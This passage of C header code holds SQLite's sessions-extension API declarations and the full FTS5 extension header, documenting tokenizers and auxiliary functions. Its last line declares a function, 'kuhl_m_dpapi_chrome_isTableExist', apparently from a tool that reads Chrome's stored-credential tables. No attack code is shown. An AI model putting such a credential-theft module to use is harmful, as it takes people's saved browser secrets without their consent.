** Configure the changeset rebaser object to rebase changesets according
** to the conflict resolutions described by buffer pRebase (size nRebase
** bytes), which must have been obtained from a previous call to
** sqlite3changeset_apply_v2().
*/
SQLITE_API int sqlite3rebaser_configure(
  sqlite3_rebaser*, 
  int nRebase, const void *pRebase
); 

/*
** CAPI3REF: Rebase a changeset
** EXPERIMENTAL
**
** Argument pIn must point to a buffer containing a changeset nIn bytes
** in size. This function allocates and populates a buffer with a copy
** of the changeset rebased rebased according to the configuration of the
** rebaser object passed as the first argument. If successful, (*ppOut)
** is set to point to the new buffer containing the rebased changeset and 
** (*pnOut) to its size in bytes and SQLITE_OK returned. It is the
** responsibility of the caller to eventually free the new buffer using
** sqlite3_free(). Otherwise, if an error occurs, (*ppOut) and (*pnOut)
** are set to zero and an SQLite error code returned.
*/
SQLITE_API int sqlite3rebaser_rebase(
  sqlite3_rebaser*,
  int nIn, const void *pIn, 
  int *pnOut, void **ppOut 
);

/*
** CAPI3REF: Delete a changeset rebaser object.
** EXPERIMENTAL
**
** Delete the changeset rebaser object and all associated resources. There
** should be one call to this function for each successful invocation
** of sqlite3rebaser_create().
*/
SQLITE_API void sqlite3rebaser_delete(sqlite3_rebaser *p); 

/*
** CAPI3REF: Streaming Versions of API functions.
**
** The six streaming API xxx_strm() functions serve similar purposes to the 
** corresponding non-streaming API functions:
**
** <table border=1 style="margin-left:8ex;margin-right:8ex">
**   <tr><th>Streaming function<th>Non-streaming equivalent</th>
**   <tr><td>sqlite3changeset_apply_strm<td>[sqlite3changeset_apply] 
**   <tr><td>sqlite3changeset_apply_strm_v2<td>[sqlite3changeset_apply_v2] 
**   <tr><td>sqlite3changeset_concat_strm<td>[sqlite3changeset_concat] 
**   <tr><td>sqlite3changeset_invert_strm<td>[sqlite3changeset_invert] 
**   <tr><td>sqlite3changeset_start_strm<td>[sqlite3changeset_start] 
**   <tr><td>sqlite3session_changeset_strm<td>[sqlite3session_changeset] 
**   <tr><td>sqlite3session_patchset_strm<td>[sqlite3session_patchset] 
** </table>
**
** Non-streaming functions that accept changesets (or patchsets) as input
** require that the entire changeset be stored in a single buffer in memory. 
** Similarly, those that return a changeset or patchset do so by returning 
** a pointer to a single large buffer allocated using sqlite3_malloc(). 
** Normally this is convenient. However, if an application running in a 
** low-memory environment is required to handle very large changesets, the
** large contiguous memory allocations required can become onerous.
**
** In order to avoid this problem, instead of a single large buffer, input
** is passed to a streaming API functions by way of a callback function that
** the sessions module invokes to incrementally request input data as it is
** required. In all cases, a pair of API function parameters such as
**
**  <pre>
**  &nbsp;     int nChangeset,
**  &nbsp;     void *pChangeset,
**  </pre>
**
** Is replaced by:
**
**  <pre>
**  &nbsp;     int (*xInput)(void *pIn, void *pData, int *pnData),
**  &nbsp;     void *pIn,
**  </pre>
**
** Each time the xInput callback is invoked by the sessions module, the first
** argument passed is a copy of the supplied pIn context pointer. The second 
** argument, pData, points to a buffer (*pnData) bytes in size. Assuming no 
** error occurs the xInput method should copy up to (*pnData) bytes of data 
** into the buffer and set (*pnData) to the actual number of bytes copied 
** before returning SQLITE_OK. If the input is completely exhausted, (*pnData) 
** should be set to zero to indicate this. Or, if an error occurs, an SQLite 
** error code should be returned. In all cases, if an xInput callback returns
** an error, all processing is abandoned and the streaming API function
** returns a copy of the error code to the caller.
**
** In the case of sqlite3changeset_start_strm(), the xInput callback may be
** invoked by the sessions module at any point during the lifetime of the
** iterator. If such an xInput callback returns an error, the iterator enters
** an error state, whereby all subsequent calls to iterator functions 
** immediately fail with the same error code as returned by xInput.
**
** Similarly, streaming API functions that return changesets (or patchsets)
** return them in chunks by way of a callback function instead of via a
** pointer to a single large buffer. In this case, a pair of parameters such
** as:
**
**  <pre>
**  &nbsp;     int *pnChangeset,
**  &nbsp;     void **ppChangeset,
**  </pre>
**
** Is replaced by:
**
**  <pre>
**  &nbsp;     int (*xOutput)(void *pOut, const void *pData, int nData),
**  &nbsp;     void *pOut
**  </pre>
**
** The xOutput callback is invoked zero or more times to return data to
** the application. The first parameter passed to each call is a copy of the
** pOut pointer supplied by the application. The second parameter, pData,
** points to a buffer nData bytes in size containing the chunk of output
** data being returned. If the xOutput callback successfully processes the
** supplied data, it should return SQLITE_OK to indicate success. Otherwise,
** it should return some other SQLite error code. In this case processing
** is immediately abandoned and the streaming API function returns a copy
** of the xOutput error code to the application.
**
** The sessions module never invokes an xOutput callback with the third 
** parameter set to a value less than or equal to zero. Other than this,
** no guarantees are made as to the size of the chunks of data returned.
*/
SQLITE_API int sqlite3changeset_apply_strm(
  sqlite3 *db,                    /* Apply change to "main" db of this handle */
  int (*xInput)(void *pIn, void *pData, int *pnData), /* Input function */
  void *pIn,                                          /* First arg for xInput */
  int(*xFilter)(
    void *pCtx,                   /* Copy of sixth arg to _apply() */
    const char *zTab              /* Table name */
  ),
  int(*xConflict)(
    void *pCtx,                   /* Copy of sixth arg to _apply() */
    int eConflict,                /* DATA, MISSING, CONFLICT, CONSTRAINT */
    sqlite3_changeset_iter *p     /* Handle describing change and conflict */
  ),
  void *pCtx                      /* First argument passed to xConflict */
);
SQLITE_API int sqlite3changeset_apply_v2_strm(
  sqlite3 *db,                    /* Apply change to "main" db of this handle */
  int (*xInput)(void *pIn, void *pData, int *pnData), /* Input function */
  void *pIn,                                          /* First arg for xInput */
  int(*xFilter)(
    void *pCtx,                   /* Copy of sixth arg to _apply() */
    const char *zTab              /* Table name */
  ),
  int(*xConflict)(
    void *pCtx,                   /* Copy of sixth arg to _apply() */
    int eConflict,                /* DATA, MISSING, CONFLICT, CONSTRAINT */
    sqlite3_changeset_iter *p     /* Handle describing change and conflict */
  ),
  void *pCtx,                     /* First argument passed to xConflict */
  void **ppRebase, int *pnRebase,
  int flags
);
SQLITE_API int sqlite3changeset_concat_strm(
  int (*xInputA)(void *pIn, void *pData, int *pnData),
  void *pInA,
  int (*xInputB)(void *pIn, void *pData, int *pnData),
  void *pInB,
  int (*xOutput)(void *pOut, const void *pData, int nData),
  void *pOut
);
SQLITE_API int sqlite3changeset_invert_strm(
  int (*xInput)(void *pIn, void *pData, int *pnData),
  void *pIn,
  int (*xOutput)(void *pOut, const void *pData, int nData),
  void *pOut
);
SQLITE_API int sqlite3changeset_start_strm(
  sqlite3_changeset_iter **pp,
  int (*xInput)(void *pIn, void *pData, int *pnData),
  void *pIn
);
SQLITE_API int sqlite3changeset_start_v2_strm(
  sqlite3_changeset_iter **pp,
  int (*xInput)(void *pIn, void *pData, int *pnData),
  void *pIn,
  int flags
);
SQLITE_API int sqlite3session_changeset_strm(
  sqlite3_session *pSession,
  int (*xOutput)(void *pOut, const void *pData, int nData),
  void *pOut
);
SQLITE_API int sqlite3session_patchset_strm(
  sqlite3_session *pSession,
  int (*xOutput)(void *pOut, const void *pData, int nData),
  void *pOut
);
SQLITE_API int sqlite3changegroup_add_strm(sqlite3_changegroup*, 
    int (*xInput)(void *pIn, void *pData, int *pnData),
    void *pIn
);
SQLITE_API int sqlite3changegroup_output_strm(sqlite3_changegroup*,
    int (*xOutput)(void *pOut, const void *pData, int nData), 
    void *pOut
);
SQLITE_API int sqlite3rebaser_rebase_strm(
  sqlite3_rebaser *pRebaser,
  int (*xInput)(void *pIn, void *pData, int *pnData),
  void *pIn,
  int (*xOutput)(void *pOut, const void *pData, int nData),
  void *pOut
);

/*
** CAPI3REF: Configure global parameters
**
** The sqlite3session_config() interface is used to make global configuration
** changes to the sessions module in order to tune it to the specific needs 
** of the application.
**
** The sqlite3session_config() interface is not threadsafe. If it is invoked
** while any other thread is inside any other sessions method then the
** results are undefined. Furthermore, if it is invoked after any sessions
** related objects have been created, the results are also undefined. 
**
** The first argument to the sqlite3session_config() function must be one
** of the SQLITE_SESSION_CONFIG_XXX constants defined below. The 
** interpretation of the (void*) value passed as the second parameter and
** the effect of calling this function depends on the value of the first
** parameter.
**
** <dl>
** <dt>SQLITE_SESSION_CONFIG_STRMSIZE<dd>
**    By default, the sessions module streaming interfaces attempt to input
**    and output data in approximately 1 KiB chunks. This operand may be used
**    to set and query the value of this configuration setting. The pointer
**    passed as the second argument must point to a value of type (int).
**    If this value is greater than 0, it is used as the new streaming data
**    chunk size for both input and output. Before returning, the (int) value
**    pointed to by pArg is set to the final value of the streaming interface
**    chunk size.
** </dl>
**
** This function returns SQLITE_OK if successful, or an SQLite error code
** otherwise.
*/
SQLITE_API int sqlite3session_config(int op, void *pArg);

/*
** CAPI3REF: Values for sqlite3session_config().
*/
#define SQLITE_SESSION_CONFIG_STRMSIZE 1

/*
** Make sure we can call this stuff from C++.
*/
#ifdef __cplusplus
}
#endif

#endif  /* !defined(__SQLITESESSION_H_) && defined(SQLITE_ENABLE_SESSION) */

/******** End of sqlite3session.h *********/
/******** Begin file fts5.h *********/
/*
** 2014 May 31
**
** The author disclaims copyright to this source code.  In place of
** a legal notice, here is a blessing:
**
**    May you do good and not evil.
**    May you find forgiveness for yourself and forgive others.
**    May you share freely, never taking more than you give.
**
******************************************************************************
**
** Interfaces to extend FTS5. Using the interfaces defined in this file, 
** FTS5 may be extended with:
**
**     * custom tokenizers, and
**     * custom auxiliary functions.
*/


#ifndef _FTS5_H
#define _FTS5_H


#ifdef __cplusplus
extern "C" {
#endif

/*************************************************************************
** CUSTOM AUXILIARY FUNCTIONS
**
** Virtual table implementations may overload SQL functions by implementing
** the sqlite3_module.xFindFunction() method.
*/

typedef struct Fts5ExtensionApi Fts5ExtensionApi;
typedef struct Fts5Context Fts5Context;
typedef struct Fts5PhraseIter Fts5PhraseIter;

typedef void (*fts5_extension_function)(
  const Fts5ExtensionApi *pApi,   /* API offered by current FTS version */
  Fts5Context *pFts,              /* First arg to pass to pApi functions */
  sqlite3_context *pCtx,          /* Context for returning result/error */
  int nVal,                       /* Number of values in apVal[] array */
  sqlite3_value **apVal           /* Array of trailing arguments */
);

struct Fts5PhraseIter {
  const unsigned char *a;
  const unsigned char *b;
};

/*
** EXTENSION API FUNCTIONS
**
** xUserData(pFts):
**   Return a copy of the context pointer the extension function was 
**   registered with.
**
** xColumnTotalSize(pFts, iCol, pnToken):
**   If parameter iCol is less than zero, set output variable *pnToken
**   to the total number of tokens in the FTS5 table. Or, if iCol is
**   non-negative but less than the number of columns in the table, return
**   the total number of tokens in column iCol, considering all rows in 
**   the FTS5 table.
**
**   If parameter iCol is greater than or equal to the number of columns
**   in the table, SQLITE_RANGE is returned. Or, if an error occurs (e.g.
**   an OOM condition or IO error), an appropriate SQLite error code is 
**   returned.
**
** xColumnCount(pFts):
**   Return the number of columns in the table.
**
** xColumnSize(pFts, iCol, pnToken):
**   If parameter iCol is less than zero, set output variable *pnToken
**   to the total number of tokens in the current row. Or, if iCol is
**   non-negative but less than the number of columns in the table, set
**   *pnToken to the number of tokens in column iCol of the current row.
**
**   If parameter iCol is greater than or equal to the number of columns
**   in the table, SQLITE_RANGE is returned. Or, if an error occurs (e.g.
**   an OOM condition or IO error), an appropriate SQLite error code is 
**   returned.
**
**   This function may be quite inefficient if used with an FTS5 table
**   created with the "columnsize=0" option.
**
** xColumnText:
**   This function attempts to retrieve the text of column iCol of the
**   current document. If successful, (*pz) is set to point to a buffer
**   containing the text in utf-8 encoding, (*pn) is set to the size in bytes
**   (not characters) of the buffer and SQLITE_OK is returned. Otherwise,
**   if an error occurs, an SQLite error code is returned and the final values
**   of (*pz) and (*pn) are undefined.
**
** xPhraseCount:
**   Returns the number of phrases in the current query expression.
**
** xPhraseSize:
**   Returns the number of tokens in phrase iPhrase of the query. Phrases
**   are numbered starting from zero.
**
** xInstCount:
**   Set *pnInst to the total number of occurrences of all phrases within
**   the query within the current row. Return SQLITE_OK if successful, or
**   an error code (i.e. SQLITE_NOMEM) if an error occurs.
**
**   This API can be quite slow if used with an FTS5 table created with the
**   "detail=none" or "detail=column" option. If the FTS5 table is created 
**   with either "detail=none" or "detail=column" and "content=" option 
**   (i.e. if it is a contentless table), then this API always returns 0.
**
** xInst:
**   Query for the details of phrase match iIdx within the current row.
**   Phrase matches are numbered starting from zero, so the iIdx argument
**   should be greater than or equal to zero and smaller than the value
**   output by xInstCount().
**
**   Usually, output parameter *piPhrase is set to the phrase number, *piCol
**   to the column in which it occurs and *piOff the token offset of the
**   first token of the phrase. Returns SQLITE_OK if successful, or an error
**   code (i.e. SQLITE_NOMEM) if an error occurs.
**
**   This API can be quite slow if used with an FTS5 table created with the
**   "detail=none" or "detail=column" option. 
**
** xRowid:
**   Returns the rowid of the current row.
**
** xTokenize:
**   Tokenize text using the tokenizer belonging to the FTS5 table.
**
** xQueryPhrase(pFts5, iPhrase, pUserData, xCallback):
**   This API function is used to query the FTS table for phrase iPhrase
**   of the current query. Specifically, a query equivalent to:
**
**       ... FROM ftstable WHERE ftstable MATCH $p ORDER BY rowid
**
**   with $p set to a phrase equivalent to the phrase iPhrase of the
**   current query is executed. Any column filter that applies to
**   phrase iPhrase of the current query is included in $p. For each 
**   row visited, the callback function passed as the fourth argument 
**   is invoked. The context and API objects passed to the callback 
**   function may be used to access the properties of each matched row.
**   Invoking Api.xUserData() returns a copy of the pointer passed as 
**   the third argument to pUserData.
**
**   If the callback function returns any value other than SQLITE_OK, the
**   query is abandoned and the xQueryPhrase function returns immediately.
**   If the returned value is SQLITE_DONE, xQueryPhrase returns SQLITE_OK.
**   Otherwise, the error code is propagated upwards.
**
**   If the query runs to completion without incident, SQLITE_OK is returned.
**   Or, if some error occurs before the query completes or is aborted by
**   the callback, an SQLite error code is returned.
**
**
** xSetAuxdata(pFts5, pAux, xDelete)
**
**   Save the pointer passed as the second argument as the extension functions 
**   "auxiliary data". The pointer may then be retrieved by the current or any
**   future invocation of the same fts5 extension function made as part of
**   the same MATCH query using the xGetAuxdata() API.
**
**   Each extension function is allocated a single auxiliary data slot for
**   each FTS query (MATCH expression). If the extension function is invoked 
**   more than once for a single FTS query, then all invocations share a 
**   single auxiliary data context.
**
**   If there is already an auxiliary data pointer when this function is
**   invoked, then it is replaced by the new pointer. If an xDelete callback
**   was specified along with the original pointer, it is invoked at this
**   point.
**
**   The xDelete callback, if one is specified, is also invoked on the
**   auxiliary data pointer after the FTS5 query has finished.
**
**   If an error (e.g. an OOM condition) occurs within this function,
**   the auxiliary data is set to NULL and an error code returned. If the
**   xDelete parameter was not NULL, it is invoked on the auxiliary data
**   pointer before returning.
**
**
** xGetAuxdata(pFts5, bClear)
**
**   Returns the current auxiliary data pointer for the fts5 extension 
**   function. See the xSetAuxdata() method for details.
**
**   If the bClear argument is non-zero, then the auxiliary data is cleared
**   (set to NULL) before this function returns. In this case the xDelete,
**   if any, is not invoked.
**
**
** xRowCount(pFts5, pnRow)
**
**   This function is used to retrieve the total number of rows in the table.
**   In other words, the same value that would be returned by:
**
**        SELECT count(*) FROM ftstable;
**
** xPhraseFirst()
**   This function is used, along with type Fts5PhraseIter and the xPhraseNext
**   method, to iterate through all instances of a single query phrase within
**   the current row. This is the same information as is accessible via the
**   xInstCount/xInst APIs. While the xInstCount/xInst APIs are more convenient
**   to use, this API may be faster under some circumstances. To iterate 
**   through instances of phrase iPhrase, use the following code:
**
**       Fts5PhraseIter iter;
**       int iCol, iOff;
**       for(pApi->xPhraseFirst(pFts, iPhrase, &iter, &iCol, &iOff);
**           iCol>=0;
**           pApi->xPhraseNext(pFts, &iter, &iCol, &iOff)
**       ){
**         // An instance of phrase iPhrase at offset iOff of column iCol
**       }
**
**   The Fts5PhraseIter structure is defined above. Applications should not
**   modify this structure directly - it should only be used as shown above
**   with the xPhraseFirst() and xPhraseNext() API methods (and by
**   xPhraseFirstColumn() and xPhraseNextColumn() as illustrated below).
**
**   This API can be quite slow if used with an FTS5 table created with the
**   "detail=none" or "detail=column" option. If the FTS5 table is created 
**   with either "detail=none" or "detail=column" and "content=" option 
**   (i.e. if it is a contentless table), then this API always iterates
**   through an empty set (all calls to xPhraseFirst() set iCol to -1).
**
** xPhraseNext()
**   See xPhraseFirst above.
**
** xPhraseFirstColumn()
**   This function and xPhraseNextColumn() are similar to the xPhraseFirst()
**   and xPhraseNext() APIs described above. The difference is that instead
**   of iterating through all instances of a phrase in the current row, these
**   APIs are used to iterate through the set of columns in the current row
**   that contain one or more instances of a specified phrase. For example:
**
**       Fts5PhraseIter iter;
**       int iCol;
**       for(pApi->xPhraseFirstColumn(pFts, iPhrase, &iter, &iCol);
**           iCol>=0;
**           pApi->xPhraseNextColumn(pFts, &iter, &iCol)
**       ){
**         // Column iCol contains at least one instance of phrase iPhrase
**       }
**
**   This API can be quite slow if used with an FTS5 table created with the
**   "detail=none" option. If the FTS5 table is created with either 
**   "detail=none" "content=" option (i.e. if it is a contentless table), 
**   then this API always iterates through an empty set (all calls to 
**   xPhraseFirstColumn() set iCol to -1).
**
**   The information accessed using this API and its companion
**   xPhraseFirstColumn() may also be obtained using xPhraseFirst/xPhraseNext
**   (or xInst/xInstCount). The chief advantage of this API is that it is
**   significantly more efficient than those alternatives when used with
**   "detail=column" tables.  
**
** xPhraseNextColumn()
**   See xPhraseFirstColumn above.
*/
struct Fts5ExtensionApi {
  int iVersion;                   /* Currently always set to 3 */

  void *(*xUserData)(Fts5Context*);

  int (*xColumnCount)(Fts5Context*);
  int (*xRowCount)(Fts5Context*, sqlite3_int64 *pnRow);
  int (*xColumnTotalSize)(Fts5Context*, int iCol, sqlite3_int64 *pnToken);

  int (*xTokenize)(Fts5Context*, 
    const char *pText, int nText, /* Text to tokenize */
    void *pCtx,                   /* Context passed to xToken() */
    int (*xToken)(void*, int, const char*, int, int, int)       /* Callback */
  );

  int (*xPhraseCount)(Fts5Context*);
  int (*xPhraseSize)(Fts5Context*, int iPhrase);

  int (*xInstCount)(Fts5Context*, int *pnInst);
  int (*xInst)(Fts5Context*, int iIdx, int *piPhrase, int *piCol, int *piOff);

  sqlite3_int64 (*xRowid)(Fts5Context*);
  int (*xColumnText)(Fts5Context*, int iCol, const char **pz, int *pn);
  int (*xColumnSize)(Fts5Context*, int iCol, int *pnToken);

  int (*xQueryPhrase)(Fts5Context*, int iPhrase, void *pUserData,
    int(*)(const Fts5ExtensionApi*,Fts5Context*,void*)
  );
  int (*xSetAuxdata)(Fts5Context*, void *pAux, void(*xDelete)(void*));
  void *(*xGetAuxdata)(Fts5Context*, int bClear);

  int (*xPhraseFirst)(Fts5Context*, int iPhrase, Fts5PhraseIter*, int*, int*);
  void (*xPhraseNext)(Fts5Context*, Fts5PhraseIter*, int *piCol, int *piOff);

  int (*xPhraseFirstColumn)(Fts5Context*, int iPhrase, Fts5PhraseIter*, int*);
  void (*xPhraseNextColumn)(Fts5Context*, Fts5PhraseIter*, int *piCol);
};

/* 
** CUSTOM AUXILIARY FUNCTIONS
*************************************************************************/

/*************************************************************************
** CUSTOM TOKENIZERS
**
** Applications may also register custom tokenizer types. A tokenizer 
** is registered by providing fts5 with a populated instance of the 
** following structure. All structure methods must be defined, setting
** any member of the fts5_tokenizer struct to NULL leads to undefined
** behaviour. The structure methods are expected to function as follows:
**
** xCreate:
**   This function is used to allocate and initialize a tokenizer instance.
**   A tokenizer instance is required to actually tokenize text.
**
**   The first argument passed to this function is a copy of the (void*)
**   pointer provided by the application when the fts5_tokenizer object
**   was registered with FTS5 (the third argument to xCreateTokenizer()). 
**   The second and third arguments are an array of nul-terminated strings
**   containing the tokenizer arguments, if any, specified following the
**   tokenizer name as part of the CREATE VIRTUAL TABLE statement used
**   to create the FTS5 table.
**
**   The final argument is an output variable. If successful, (*ppOut) 
**   should be set to point to the new tokenizer handle and SQLITE_OK
**   returned. If an error occurs, some value other than SQLITE_OK should
**   be returned. In this case, fts5 assumes that the final value of *ppOut 
**   is undefined.
**
** xDelete:
**   This function is invoked to delete a tokenizer handle previously
**   allocated using xCreate(). Fts5 guarantees that this function will
**   be invoked exactly once for each successful call to xCreate().
**
** xTokenize:
**   This function is expected to tokenize the nText byte string indicated 
**   by argument pText. pText may or may not be nul-terminated. The first
**   argument passed to this function is a pointer to an Fts5Tokenizer object
**   returned by an earlier call to xCreate().
**
**   The second argument indicates the reason that FTS5 is requesting
**   tokenization of the supplied text. This is always one of the following
**   four values:
**
**   <ul><li> <b>FTS5_TOKENIZE_DOCUMENT</b> - A document is being inserted into
**            or removed from the FTS table. The tokenizer is being invoked to
**            determine the set of tokens to add to (or delete from) the
**            FTS index.
**
**       <li> <b>FTS5_TOKENIZE_QUERY</b> - A MATCH query is being executed 
**            against the FTS index. The tokenizer is being called to tokenize 
**            a bareword or quoted string specified as part of the query.
**
**       <li> <b>(FTS5_TOKENIZE_QUERY | FTS5_TOKENIZE_PREFIX)</b> - Same as
**            FTS5_TOKENIZE_QUERY, except that the bareword or quoted string is
**            followed by a "*" character, indicating that the last token
**            returned by the tokenizer will be treated as a token prefix.
**
**       <li> <b>FTS5_TOKENIZE_AUX</b> - The tokenizer is being invoked to 
**            satisfy an fts5_api.xTokenize() request made by an auxiliary
**            function. Or an fts5_api.xColumnSize() request made by the same
**            on a columnsize=0 database.  
**   </ul>
**
**   For each token in the input string, the supplied callback xToken() must
**   be invoked. The first argument to it should be a copy of the pointer
**   passed as the second argument to xTokenize(). The third and fourth
**   arguments are a pointer to a buffer containing the token text, and the
**   size of the token in bytes. The 4th and 5th arguments are the byte offsets
**   of the first byte of and first byte immediately following the text from
**   which the token is derived within the input.
**
**   The second argument passed to the xToken() callback ("tflags") should
**   normally be set to 0. The exception is if the tokenizer supports 
**   synonyms. In this case see the discussion below for details.
**
**   FTS5 assumes the xToken() callback is invoked for each token in the 
**   order that they occur within the input text.
**
**   If an xToken() callback returns any value other than SQLITE_OK, then
**   the tokenization should be abandoned and the xTokenize() method should
**   immediately return a copy of the xToken() return value. Or, if the
**   input buffer is exhausted, xTokenize() should return SQLITE_OK. Finally,
**   if an error occurs with the xTokenize() implementation itself, it
**   may abandon the tokenization and return any error code other than
**   SQLITE_OK or SQLITE_DONE.
**
** SYNONYM SUPPORT
**
**   Custom tokenizers may also support synonyms. Consider a case in which a
**   user wishes to query for a phrase such as "first place". Using the 
**   built-in tokenizers, the FTS5 query 'first + place' will match instances
**   of "first place" within the document set, but not alternative forms
**   such as "1st place". In some applications, it would be better to match
**   all instances of "first place" or "1st place" regardless of which form
**   the user specified in the MATCH query text.
**
**   There are several ways to approach this in FTS5:
**
**   <ol><li> By mapping all synonyms to a single token. In this case, the 
**            In the above example, this means that the tokenizer returns the
**            same token for inputs "first" and "1st". Say that token is in
**            fact "first", so that when the user inserts the document "I won
**            1st place" entries are added to the index for tokens "i", "won",
**            "first" and "place". If the user then queries for '1st + place',
**            the tokenizer substitutes "first" for "1st" and the query works
**            as expected.
**
**       <li> By querying the index for all synonyms of each query term
**            separately. In this case, when tokenizing query text, the
**            tokenizer may provide multiple synonyms for a single term 
**            within the document. FTS5 then queries the index for each 
**            synonym individually. For example, faced with the query:
**
**   <codeblock>
**     ... MATCH 'first place'</codeblock>
**
**            the tokenizer offers both "1st" and "first" as synonyms for the
**            first token in the MATCH query and FTS5 effectively runs a query 
**            similar to:
**
**   <codeblock>
**     ... MATCH '(first OR 1st) place'</codeblock>
**
**            except that, for the purposes of auxiliary functions, the query
**            still appears to contain just two phrases - "(first OR 1st)" 
**            being treated as a single phrase.
**
**       <li> By adding multiple synonyms for a single term to the FTS index.
**            Using this method, when tokenizing document text, the tokenizer
**            provides multiple synonyms for each token. So that when a 
**            document such as "I won first place" is tokenized, entries are
**            added to the FTS index for "i", "won", "first", "1st" and
**            "place".
**
**            This way, even if the tokenizer does not provide synonyms
**            when tokenizing query text (it should not - to do so would be
**            inefficient), it doesn't matter if the user queries for 
**            'first + place' or '1st + place', as there are entries in the
**            FTS index corresponding to both forms of the first token.
**   </ol>
**
**   Whether it is parsing document or query text, any call to xToken that
**   specifies a <i>tflags</i> argument with the FTS5_TOKEN_COLOCATED bit
**   is considered to supply a synonym for the previous token. For example,
**   when parsing the document "I won first place", a tokenizer that supports
**   synonyms would call xToken() 5 times, as follows:
**
**   <codeblock>
**       xToken(pCtx, 0, "i",                      1,  0,  1);
**       xToken(pCtx, 0, "won",                    3,  2,  5);
**       xToken(pCtx, 0, "first",                  5,  6, 11);
**       xToken(pCtx, FTS5_TOKEN_COLOCATED, "1st", 3,  6, 11);
**       xToken(pCtx, 0, "place",                  5, 12, 17);
**</codeblock>
**
**   It is an error to specify the FTS5_TOKEN_COLOCATED flag the first time
**   xToken() is called. Multiple synonyms may be specified for a single token
**   by making multiple calls to xToken(FTS5_TOKEN_COLOCATED) in sequence. 
**   There is no limit to the number of synonyms that may be provided for a
**   single token.
**
**   In many cases, method (1) above is the best approach. It does not add 
**   extra data to the FTS index or require FTS5 to query for multiple terms,
**   so it is efficient in terms of disk space and query speed. However, it
**   does not support prefix queries very well. If, as suggested above, the
**   token "first" is substituted for "1st" by the tokenizer, then the query:
**
**   <codeblock>
**     ... MATCH '1s*'</codeblock>
**
**   will not match documents that contain the token "1st" (as the tokenizer
**   will probably not map "1s" to any prefix of "first").
**
**   For full prefix support, method (3) may be preferred. In this case, 
**   because the index contains entries for both "first" and "1st", prefix
**   queries such as 'fi*' or '1s*' will match correctly. However, because
**   extra entries are added to the FTS index, this method uses more space
**   within the database.
**
**   Method (2) offers a midpoint between (1) and (3). Using this method,
**   a query such as '1s*' will match documents that contain the literal 
**   token "1st", but not "first" (assuming the tokenizer is not able to
**   provide synonyms for prefixes). However, a non-prefix query like '1st'
**   will match against "1st" and "first". This method does not require
**   extra disk space, as no extra entries are added to the FTS index. 
**   On the other hand, it may require more CPU cycles to run MATCH queries,
**   as separate queries of the FTS index are required for each synonym.
**
**   When using methods (2) or (3), it is important that the tokenizer only
**   provide synonyms when tokenizing document text (method (2)) or query
**   text (method (3)), not both. Doing so will not cause any errors, but is
**   inefficient.
*/
typedef struct Fts5Tokenizer Fts5Tokenizer;
typedef struct fts5_tokenizer fts5_tokenizer;
struct fts5_tokenizer {
  int (*xCreate)(void*, const char **azArg, int nArg, Fts5Tokenizer **ppOut);
  void (*xDelete)(Fts5Tokenizer*);
  int (*xTokenize)(Fts5Tokenizer*, 
      void *pCtx,
      int flags,            /* Mask of FTS5_TOKENIZE_* flags */
      const char *pText, int nText, 
      int (*xToken)(
        void *pCtx,         /* Copy of 2nd argument to xTokenize() */
        int tflags,         /* Mask of FTS5_TOKEN_* flags */
        const char *pToken, /* Pointer to buffer containing token */
        int nToken,         /* Size of token in bytes */
        int iStart,         /* Byte offset of token within input text */
        int iEnd            /* Byte offset of end of token within input text */
      )
  );
};

/* Flags that may be passed as the third argument to xTokenize() */
#define FTS5_TOKENIZE_QUERY     0x0001
#define FTS5_TOKENIZE_PREFIX    0x0002
#define FTS5_TOKENIZE_DOCUMENT  0x0004
#define FTS5_TOKENIZE_AUX       0x0008

/* Flags that may be passed by the tokenizer implementation back to FTS5
** as the third argument to the supplied xToken callback. */
#define FTS5_TOKEN_COLOCATED    0x0001      /* Same position as prev. token */

/*
** END OF CUSTOM TOKENIZERS
*************************************************************************/

/*************************************************************************
** FTS5 EXTENSION REGISTRATION API
*/
typedef struct fts5_api fts5_api;
struct fts5_api {
  int iVersion;                   /* Currently always set to 2 */

  /* Create a new tokenizer */
  int (*xCreateTokenizer)(
    fts5_api *pApi,
    const char *zName,
    void *pContext,
    fts5_tokenizer *pTokenizer,
    void (*xDestroy)(void*)
  );

  /* Find an existing tokenizer */
  int (*xFindTokenizer)(
    fts5_api *pApi,
    const char *zName,
    void **ppContext,
    fts5_tokenizer *pTokenizer
  );

  /* Create a new auxiliary function */
  int (*xCreateFunction)(
    fts5_api *pApi,
    const char *zName,
    void *pContext,
    fts5_extension_function xFunction,
    void (*xDestroy)(void*)
  );
};

/*
** END OF REGISTRATION API
*************************************************************************/

#ifdef __cplusplus
}  /* end of the 'extern "C"' block */
#endif

#endif /* _FTS5_H */

/******** End of fts5.h *********/

BOOL kuhl_m_dpapi_chrome_isTableExist(sqlite3 *pDb, const char *table);
